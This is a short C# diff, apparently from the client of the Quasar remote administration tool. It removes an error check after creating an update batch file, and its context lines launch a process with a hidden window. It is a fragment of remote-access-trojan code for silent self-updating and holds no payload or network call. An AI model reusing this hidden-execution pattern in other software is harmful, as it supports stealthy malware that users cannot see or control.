@@ -20,9 +20,6 @@ namespace Quasar.Client.Setup
 
             string batchFile = BatchFile.CreateUpdateBatch(Application.ExecutablePath, newFilePath);
 
-            if (string.IsNullOrEmpty(batchFile))
-                throw new Exception("Could not create update batch file.");
-
             ProcessStartInfo startInfo = new ProcessStartInfo
             {
                 WindowStyle = ProcessWindowStyle.Hidden,
